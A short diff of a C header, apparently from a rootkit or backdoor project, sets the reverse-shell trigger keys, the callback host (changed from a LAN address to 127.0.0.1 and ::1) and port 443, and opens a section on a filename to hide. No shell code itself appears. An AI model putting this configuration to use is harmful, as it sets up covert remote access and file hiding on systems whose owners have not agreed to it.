@@ -16,7 +16,7 @@
 //reverse-shell definitions
 #define KEY_R_4 "reverseshell4"
 #define KEY_R_6 "reverseshell6"
-#define REM_HOST4 "192.168.1.218"
+#define REM_HOST4 "127.0.0.1"
 #define REM_HOST6 "::1"
 #define REM_PORT 443
 //filename to hide
